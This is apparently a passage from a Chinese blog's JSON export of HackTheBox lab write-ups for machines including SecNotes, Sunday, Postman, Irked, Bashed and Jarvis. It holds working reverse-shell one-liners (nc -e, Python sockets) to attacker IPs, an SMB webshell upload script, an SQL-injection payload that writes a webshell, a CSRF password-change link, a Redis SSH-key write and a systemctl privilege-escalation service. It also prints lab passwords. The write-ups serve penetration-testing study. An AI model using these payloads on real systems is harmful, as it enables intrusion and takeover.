microsoft-ds8808/tcp open ssports-bcastNmap done: 1 IP address (1 host up) scanned in 2657.65 seconds 80一个登录页面： 8808IIS默认页面： Secure Notes80端口随意注册登录： 可以得到管理员用户名和提示信息 二次注入非预期，注册时用户名可以二次注入，如果用户名是&#39; or 1=&#39;1,登录后可以查看所有notes： New site里直接得到Tyler账号密码： 12\\\\secnotes.htb\\new-sitetyler &#x2F; 92g!mA8BGjOirkL%OG*&amp; Contact csrfContact那里输入链接，会被直接访问： change password修改密码默认是post，不校验原密码，但get形式也可以正常进行，那就是通过CSRF去修改管理员密码： 12http:&#x2F;&#x2F;10.10.10.97&#x2F;change_pass.php?password&#x3D;Aa123456&amp;confirm_password&#x3D;Aa123456&amp;submit&#x3D;submithttp:&#x2F;&#x2F;10.10.14.12:4445 tyler之后以tyler用户登录，得到账号密码： SMB直接smb查看可以看到newsite，就是8808端口那个： webshell参考80端口的php，直接smb传个php webshell到8808： reverse shell直接smb传个nc上去反弹shell 1nc64.exe -e cmd.exe 10.10.14.12 4445 user flag用户桌面目录得到user.txt: shell.sh因为有自动清除机制，可以脚本自动操作： 123456789101112131415161718#!/bin/bashif [ \"$#\" -ne 2 ]; then echo \"Usage: $0 [ip] [port]\" echo \"Include ip and port to connect back to\" exitfi;ip=$1port=$2echo \"[*] Uploading webshell and nc.exe\"smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' //10.10.10.97/new-site -c 'put miao.php miao.php' || (echo \"[-] Upload php failed\" &amp;&amp; exit 1)smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' //10.10.10.97/new-site -c 'put nc64.exe nc64.exe' || (echo \"[-] Upload nc failed\" &amp;&amp; exit 1)echo \"[+] Successfully uploaded webshell and nc.exe\"echo \"[*] Triggering nc shell callback to $&#123;ip&#125;:$&#123;port&#125;\"curl \"http://10.10.10.97:8808/0xdf.php?cmd=nc64.exe+-e+cmd.exe+$&#123;ip&#125;+$&#123;port&#125;\" WSL从根目录开始可以发现Distros\\Ubuntu，这是win10 WSL： bash.exe 查找bash直接运行，可以得到ubuntu root： 1234where &#x2F;R c:\\ bash.exec:\\Windows\\WinSxS\\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\\bash.exepython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; .bash_history这个bash_history里有历史信息，里面有Administrator密码： 看起来管理员正在尝试自己挂载本地文件系统，并且有管理员密码。甚至用户似乎都试图清除bash历史记录，但是由于当前会话是在退出时写入的，因此它仅清除该会话之前的历史记录。 12345678910111213141516171819202122root@SECNOTES:~# cat .bash_historycat .bash_historycd &#x2F;mnt&#x2F;c&#x2F;lscd Users&#x2F;cd &#x2F;cd ~lspwdmkdir filesystemmount &#x2F;&#x2F;127.0.0.1&#x2F;c$ filesystem&#x2F;sudo apt install cifs-utilsmount &#x2F;&#x2F;127.0.0.1&#x2F;c$ filesystem&#x2F;mount &#x2F;&#x2F;127.0.0.1&#x2F;c$ filesystem&#x2F; -o user&#x3D;administratorcat &#x2F;proc&#x2F;filesystemssudo modprobe cifssmbclientapt install smbclientsmbclientsmbclient -U &#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39; \\\\\\\\127.0.0.1\\\\c$&gt; .bash_historyless .bash_history Filesystem另一种方式是通过filesystem获取信息,bash文件系统位于AppData文件夹rootfs夹中： 1C:\\Users\\tyler\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs&gt; root flag然后直接smb或者psexec，得到Administrator用户桌面得到root.txt: 参考资料 HTB: SecNotes | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/01/19/htb-secnotes.html#intended-route-xsrf https://www.hackthebox.eu/home/machines/writeup/151 HackTheBox - SecNotes - YouTubehttps://www.youtube.com/watch?v=PJXb2pK8K84&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sunday - HackTheBox","slug":"Sunday-HackTheBox","date":"2020-02-16T07:20:34.000Z","updated":"2021-02-01T07:21:48.528Z","comments":true,"path":"2020/02/16/Sunday-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/16/Sunday-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/136 10.10.10.76 端口扫描123456789101112131415$ nmap -sT -Pn -p- --min-rate 5000 10.10.10.76Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 14:44 CSTWarning: 10.10.10.76 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.10.76Host is up (0.075s latency).Not shown: 65431 closed ports, 99 filtered portsPORT STATE SERVICE79/tcp open finger111/tcp open rpcbind22022/tcp open unknown38408/tcp open unknown52740/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 1898.30 seconds finger79是finger server，直接用脚本枚举用户： https://github.com/pentestmonkey/finger-user-enum 得到两个有效用户名： 1234.&#x2F;finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 10.10.10.76sammy@10.10.10.76: sammy pts&#x2F;2 &lt;Sep 27 13:55&gt; 10.10.16.26 ..sunny@10.10.10.76: sunny pts&#x2F;3 &lt;Apr 24 10:48&gt; 10.10.14.4 .. ssh brute forcessh端口是22022，简单的爆破得到有效的账号密码： 1sunny ： sunday Sunny然后直接ssh登录sunny用户，ssh有个报错需要指定算法： 1ssh -okexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022 backupbackup目录下有shadow.backup: shadow crack 直接破解出sammy用户密码： 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtcooldude! (sammy) user flag然后ssh登录sammy用户，得到user.txt: 提权信息Sudo -l显示可以无密码以root身份运行wget： 利用方式： https://gtfobins.github.io/gtfobins/wget/#sudo root flagwget利用方式非常多，参考资料里0xdf给了6种，最简单的直接使用file协议报错信息得到root flag： 参考资料 https://github.com/pentestmonkey/finger-user-enum https://gtfobins.github.io/gtfobins/wget/#sudo https://www.hackthebox.eu/home/machines/writeup/136 HTB: Sunday | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/09/29/htb-sunday.html HackTheBox - Sunday - YouTubehttps://www.youtube.com/watch?v=xUrq29OTSuM&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Blocky - HackTheBox","slug":"Blocky-HackTheBox","date":"2020-02-15T06:45:08.000Z","updated":"2021-01-26T06:46:10.918Z","comments":true,"path":"2020/02/15/Blocky-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/15/Blocky-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/48 10.10.10.37 端口扫描21,22和80: 123456789101112131415161718192021$ nmap -sC -sV 10.10.10.37Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 14:00 CSTNmap scan report for 10.10.10.37Host is up (0.072s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5a22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)| 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)|_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.8|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: BlockyCraft &amp;#8211; Under Construction!8192/tcp closed sophosService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 83.85 seconds 80是一个wordpress： 目录扫描12345678910gobuster dir -u http://10.10.10.37/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50/wiki (Status: 301)/wp-content (Status: 301)/plugins (Status: 301)/wp-includes (Status: 301)/javascript (Status: 301)/wp-admin (Status: 301)/phpmyadmin (Status: 301)/server-status (Status: 403) 目录扫描能发现一些目录，其中plugins里面两个jar文件： (可能有修改，wp是直接plugins里就有显示，我做的时候显示为空，访问plugins/files才能看到文件)： reverse engineBlockyCore.jar中得到sql密码： 1public String sqlPass &#x3D; &quot;8YsqfCTnvxAUeduzjNSXe22&quot;; user flag这个密码就是ssh密码，用户名是前面wordpress里可以得到的，Posted on July 2, 2017 by Notch, 直接ssh登录，得到user.txt: 提权信息这个应该是最简单的了，sudo完全没限制： 提权 &amp;&amp; root flag直接sudo到root,读取root.txt: 参考资料 HTB: Blocky | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/06/30/htb-blocky.html https://www.hackthebox.eu/home/machines/writeup/48 HackTheBox - Blocky - YouTubehttps://www.youtube.com/watch?v=C2O-rilXA6I&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Postman - HackTheBox","slug":"Postman-HackTheBox","date":"2020-02-14T06:49:52.000Z","updated":"2021-01-21T06:51:35.299Z","comments":true,"path":"2020/02/14/Postman-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/14/Postman-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/215 10.10.10.160 端口扫描需要全端口扫描，22,80,6379,10000: 123456789101112131415nmap -p- -sC -sV 10.10.10.160PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)| 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek's Personal Website6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel redis未授权 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf redis未授权，就是常规的写ssh公钥，redis默认路径： 123456789(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") &gt; id_rsa-key.txtcat id_rsa-key.txt | redis-cli -h 10.10.10.160 -x set miao# redisget miaoconfig set dir /var/lib/redis/.sshconfig set dbfilename authorized_keyssaveexit 然后以redis用户ssh登录： 信息搜集opt目录下有个id_rsa.bak，是一个加密的ssh私钥： john crack1234python /usr/share/john/ssh2john.py id_rsa.bak &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtcomputer2008 user flag不能直接使用私钥登录，但破解出来的密码就是Matt用户密码，可以切换过去在用户目录得到user.txt: Webmin 回到10000端口，直接访问提示需要用域名，加hosts： 110.10.10.160 Postman 访问是一个webmin： 用户名密码就是： 1Matt ： computer2008 exploit1.910版本的webmin，存在已知漏洞，msf里也有模块,注意需要ssl设置为true： 123use linux&#x2F;http&#x2F;webmin_packageup_rceset SSL true root flag打到root shell,得到root.txt: 参考资料 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf HTB: Postman | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/03/14/htb-postman.html https://www.hackthebox.eu/home/machines/writeup/215 HackTheBox - Postman - YouTubehttps://www.youtube.com/watch?v=jJnHET1o8ZQ&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Irked - HackTheBox","slug":"Irked-HackTheBox","date":"2020-02-13T06:37:09.000Z","updated":"2021-01-18T06:38:31.774Z","comments":true,"path":"2020/02/13/Irked-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/13/Irked-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/163 10.10.10.117 端口扫描需要全端口,rpc和irc端口默认扫不到： 1234567891011121314151617181920212223242526272829303132333435$ nmap -sC -sV -p- 10.10.10.117Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 13:50 CSTNmap scan report for 10.10.10.117Host is up (0.070s latency).Not shown: 65527 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey:| 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)| 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)| 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Site doesn't have a title (text/html).111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 37278/tcp status| 100024 1 44225/tcp6 status| 100024 1 53183/udp status|_ 100024 1 55149/udp6 status6697/tcp open irc UnrealIRCd8067/tcp open irc UnrealIRCd10134/tcp filtered unknown37278/tcp open status 1 (RPC #100024)65534/tcp open irc UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1384.51 seconds 80一张图，页面信息也说明了IRC服务： 8067irc服务端口，用客户端连接可以知道是Unreal 3.2.8.1： 1irssi -c 10.10.10.117 --port 8067 UnrealIRCd搜索发现相关漏洞： UnrealIRCd 3.2.8.1 - Remote Downloader/Execute - Linux remote Exploithttps://www.exploit-db.com/exploits/13853 UnrealIRCD 3.2.8.1 Backdoor Command Executionhttps://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/ exploitmsf一键打： 1python -c \"import pty;pty.spawn('/bin/bash')\" 信息搜集在/home/djmardov/Documents目录里有个.backup文件，给出了steg backup密码： 1UPupDOWNdownLRlrBAbaSSss steghide现在已有信息，可能有隐写的就80那张图,提取得到一个pass.txt： 12wget http://10.10.10.117/irked.jpgsteghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg 12➜ Irked cat pass.txtKab6h+m+bbp2J:HG user flag得到的密码就是djmardov用户的密码，ssh登录，Documents目录里得到user.txt: 提权信息基础的suid，发现/usr/bin/viewuser： 1find / -type f -perm -4000 2&gt;/dev/null 尝试运行，发现它内部调用/tmp/listusers： 那就很简单了，/tmp/listusers可控，可以执行任意命令 提权 &amp;&amp; root flag直接调用/bin/bash即可： /tmp/listusers1&#x2F;bin&#x2F;bash 参考资料 UnrealIRCd 3.2.8.1 - Remote Downloader/Execute - Linux remote Exploithttps://www.exploit-db.com/exploits/13853 UnrealIRCD 3.2.8.1 Backdoor Command Executionhttps://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/ https://www.hackthebox.eu/home/machines/writeup/163 HackTheBox - Irked - YouTubehttps://www.youtube.com/watch?v=OGFTM_qvtVI&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bashed - HackTheBox","slug":"Bashed-HackTheBox","date":"2020-02-12T07:37:12.000Z","updated":"2021-01-11T07:39:28.840Z","comments":true,"path":"2020/02/12/Bashed-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/12/Bashed-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/118 10.10.10.68 端口扫描就一个80: 123456789101112$ nmap -sC -sV 10.10.10.68Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 15:00 CSTNmap scan report for 10.10.10.68Host is up (0.070s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Arrexel's Development SiteService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 32.43 seconds 80phpbash: 目录扫描扫描发现dev目录，里面有个phpbash.php: 1234567891011121314gobuster dir -u http:&#x2F;&#x2F;10.10.10.68&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt -t 50&#x2F;.htaccess (Status: 403)&#x2F;.htpasswd (Status: 403)&#x2F;.hta (Status: 403)&#x2F;css (Status: 301)&#x2F;dev (Status: 301)&#x2F;fonts (Status: 301)&#x2F;images (Status: 301)&#x2F;index.html (Status: 200)&#x2F;js (Status: 301)&#x2F;php (Status: 301)&#x2F;server-status (Status: 403)&#x2F;uploads (Status: 301) phpbash这就是自带的webshell： reverse shellphpbash直接用常规的nc打不回来reverse shell，可以用python： 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' user flag当前虽然是www-data用户，但已经有权限去读arrexel用户目录的user.txt了： 提权信息scriptmanagerwww-data用户可以以scriptmanager身份执行任意命令，那就先切到scriptmanager用户： 12sudo -u scriptmanager /bin/bashpython -c 'import pty; pty.spawn(\"/bin/bash\")' scripts根目录有个scripts目录，里面文件提示很明显，py是scriptmanager权限，txt是root权限，应该就是root定时运行test.py: 提权 &amp; root flag:那就直接修改test.py,得到root shell, 读取root.txt: 1echo \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.10\\\",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\" &gt; test.py 参考资料 https://www.hackthebox.eu/home/machines/writeup/118 HTB: Bashed | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/04/29/htb-bashed.html HackTheBox - Bashed - YouTubehttps://www.youtube.com/watch?v=2DqdPcbYcy8&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Jarvis - HackTheBox","slug":"Jarvis-HackTheBox","date":"2020-02-11T06:36:46.000Z","updated":"2021-01-07T06:37:59.690Z","comments":true,"path":"2020/02/11/Jarvis-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/194 10.10.10.143 端口扫描需要全端口，有一个64999(不过也没怎么用到这个端口)： 1234567891011121314151617181920212223242526272829303132333435363738$ nmap -p- --min-rate=1000 10.10.10.143Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CSTNmap scan report for 10.10.10.143Host is up (0.071s latency).Not shown: 65531 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http45505/tcp filtered unknown64999/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 1008.70 seconds$ nmap -sC -sV -p 22,80,64999 10.10.10.143Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CSTNmap scan report for 10.10.10.143Host is up (0.082s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey:| 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)| 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)|_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Stark Hotel64999/tcp open http Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds 80一个hotel： 64999直接访问显示banned 90秒： SQL注入80的web很基础的sql注入： sqli to webshellload_file,into outfile 读写文件，直接写wbeshell： 1http:&#x2F;&#x2F;10.10.10.143&#x2F;room.php?cod&#x3D;-1 union select 1,&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;,3,4,5,6,7 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;miao.php&#39; reverse shell服务器有nc，直接reverse shell： 12310.10.10.143&#x2F;miao.php?cmd&#x3D;nc -e &#x2F;bin&#x2F;bash 10.10.14.7 4445python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 信息搜集当前是www-data用户，sudo -l显示可以无密码以pepper身份执行/var/www/Admin-Utilities/simpler.py： 命令注入查看这个文件，里面有一个exec_ping函数调用了system，command是我们输入的，有简单的过滤： 12345678def exec_ping(): forbidden = ['&amp;', ';', '-', '`', '||', '|'] command = input('Enter an IP: ') for i in forbidden: if i in command: print('Got you') exit() os.system('ping ' + command) 但可以使用$(cmd)这种方式执行命令： 123sudo -u pepper /var/www/Admin-Utilities/simpler.py -pEnter an IP: $(whoami).test.com simpler.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#!/usr/bin/env python3from datetime import datetimeimport sysimport osfrom os import listdirimport redef show_help(): message='''********************************************************* Simpler - A simple simplifier ;) ** Version 1.0 *********************************************************Usage: python3 simpler.py [options]Options: -h/--help : This help -s : Statistics -l : List the attackers IP -p : ping an attacker IP ''' print(message)def show_header(): print('''*********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _/ __| | '_ ` _ \\| '_ \\| |/ _ \\ '__| '_ \\| | | |\\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| ||___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es***********************************************''')def show_statistics(): path = '/home/pepper/Web/Logs/' print('Statistics\\n-----------') listed_files = listdir(path) count = len(listed_files) print('Number of Attackers: ' + str(count)) level_1 = 0 dat = datetime(1, 1, 1) ip_list = [] reks = [] ip = '' req = '' rek = '' for i in listed_files: f = open(path + i, 'r') lines = f.readlines() level2, rek = get_max_level(lines) fecha, requ = date_to_num(lines) ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] if fecha &gt; dat: dat = fecha req = requ ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] if int(level2) &gt; int(level_1): level_1 = level2 ip_list = [ip] reks=[rek] elif int(level2) == int(level_1): ip_list.append(ip) reks.append(rek) f.close() print('Most Risky:') if len(ip_list) &gt; 1: print('More than 1 ip found') cont = 0 for i in ip_list: print(' ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont]) cont = cont + 1 print('Most Recent: ' + ip2 + ' --&gt; ' + str(dat) + ' ' + req)def list_ip(): print('Attackers\\n-----------') path = '/home/pepper/Web/Logs/' listed_files = listdir(path) for i in listed_files: f = open(path + i,'r') lines = f.readlines() level,req = get_max_level(lines) print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level) f.close()def date_to_num(lines): dat = datetime(1,1,1) ip = '' req='' for i in lines: if 'Level' in i: fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\\n')[0] regex = '(\\d+)-(.*)-(\\d+)(.*)' logEx=re.match(regex, fecha).groups() mes = to_dict(logEx[1]) fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3] fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S') if fecha &gt; dat: dat = fecha req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10] return dat, reqdef to_dict(name): month_dict = &#123;'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'&#125; return month_dict[name]def get_max_level(lines): level=0 for j in lines: if 'Level' in j: if int(j.split(' ')[4]) &gt; int(level): level = j.split(' ')[4] req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10] return level, reqdef exec_ping(): forbidden = ['&amp;', ';', '-', '`', '||', '|'] command = input('Enter an IP: ') for i in forbidden: if i in command: print('Got you') exit() os.system('ping ' + command)if __name__ == '__main__': show_header() if len(sys.argv) != 2: show_help() exit() if sys.argv[1] == '-h' or sys.argv[1] == '--help': show_help() exit() elif sys.argv[1] == '-s': show_statistics() exit() elif sys.argv[1] == '-l': list_ip() exit() elif sys.argv[1] == '-p': exec_ping() exit() else: show_help() exit() pepper shell那就直接以pepper身份反弹shell: 12345sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p$(&#x2F;tmp&#x2F;miao.sh)python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; ssh key为了后续方便操作可以直接把ssh公钥写进去： 123mkdir .sshcd .sshecho 'ssh-rsa *****' &gt; authorized_keys miao.sh123echo -e &#39;#!&#x2F;bin&#x2F;bash\\n\\nnc -e &#x2F;bin&#x2F;bash 10.10.14.7 4446&#39; &gt; &#x2F;tmp&#x2F;miao.shchmod +x &#x2F;tmp&#x2F;miao.sh user flagpetter用户目录得到user.txt: 提权信息systemctl有suid： 1find / -perm -u=s -type f 2&gt;/dev/null 利用方式： systemctl | GTFOBinshttps://gtfobins.github.io/gtfobins/systemctl/ 就是创建一个service，执行命令 miao.service123456[Service]Type&#x3D;oneshotExecStart&#x3D;&#x2F;bin&#x2F;bash -c &#39;nc -e &#x2F;bin&#x2F;bash 10.10.14.7 4447&#39;[Install]WantedBy&#x3D;multi-user.target 提权 &amp; root flag12systemctl link /tmp/miao.servicesystemctl enable --now /tmp/miao.service 打到root shell，读取root.txt: 参考资料 systemctl | GTFOBinshttps://gtfobins.github.io/gtfobins/systemctl/ HTB: Jarvis | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/11/09/htb-jarvis.html https://www.hackthebox.eu/home/machines/writeup/194 HackTheBox - Jarvis - YouTubehttps://www.youtube.com/watch?v=YHHWvXBfwQ8&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Poison - HackTheBox","slug":"Poison-HackTheBox","date":"2020-02-10T06:27:14.000Z","updated":"2021-01-05T06:28:20.838Z","comments":true,"path":"2020/02/10/Poison-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/10/Poison-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/132 10.10.10.84 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.10.84Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 13:40 CSTNmap scan report for 10.10.10.84Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)| ssh-hostkey:| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.56 seconds web是一个测试本地php文件的site： 有个listfiles用来列出文件，得到pwdbackup.txt： /etc/passwd很基础的lfi，读取passwd得到用户名，后面要用： pwdbackup.txt这特喵的13次base64，解出来一个密码：Charix!2#4%6&amp;8(0 1This password is secure, it&#39;s encoded atleast 13 